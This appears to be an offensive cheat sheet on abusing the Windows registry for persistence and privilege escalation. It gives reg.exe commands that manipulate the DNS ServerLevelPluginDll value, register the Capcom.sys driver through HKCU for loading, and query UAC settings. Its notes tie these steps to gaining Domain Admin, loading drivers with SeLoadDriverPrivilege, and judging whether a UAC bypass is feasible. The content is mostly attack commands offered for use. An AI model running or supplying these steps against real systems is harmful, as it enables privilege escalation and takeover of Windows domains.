# Registry Abuse

Goal: Modify registry keys for persistence or privilege escalation.

---

# Query DNS Plugin DLL

reg query HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

---

# Delete DNS Plugin

reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll

---

# Add Driver Reference

reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

---

# Check UAC

REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

---

# Tactical Notes

- DNS plugin DLL abuse → Domain Admin.
- Driver loading requires SeLoadDriverPrivilege.
- UAC checks determine bypass feasibility.
